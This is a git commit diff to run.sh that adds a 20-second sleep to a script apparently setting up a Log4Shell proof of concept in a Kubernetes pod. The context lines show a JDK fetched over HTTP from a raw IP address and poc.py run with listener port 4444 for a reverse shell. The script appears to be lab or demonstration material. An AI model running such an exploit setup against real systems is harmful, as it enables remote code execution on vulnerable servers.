a018d2cda2d7a40f1e38bc240c2943b09e6248dd
Nanda_Kumar <42697805+nandakrr@users.noreply.github.com>
2022-02-22 12:46:45 +0530

    Update run.sh

--- run.sh
+++ run.sh
@@ -7,5 +7,6 @@ kubectl exec -it nc-pod -- wget 152.67.166.153/jdk-8u20-linux-x64.tar.gz
 kubectl exec -it nc-pod -- tar -xf jdk-8u20-linux-x64.tar.gz
 kubectl exec -it nc-pod -- mv jdk1.8.0_20 log4j-shell-poc/
 kubectl exec -it nc-pod -- pip install -r log4j-shell-poc/requirements.txt
+sleep 20
 ip=`kubectl get all | grep nc-svc | awk '{print $4}'`
 kubectl exec -it nc-pod -- python3 log4j-shell-poc/poc.py --userip $ip --webport 8000 --lport 4444
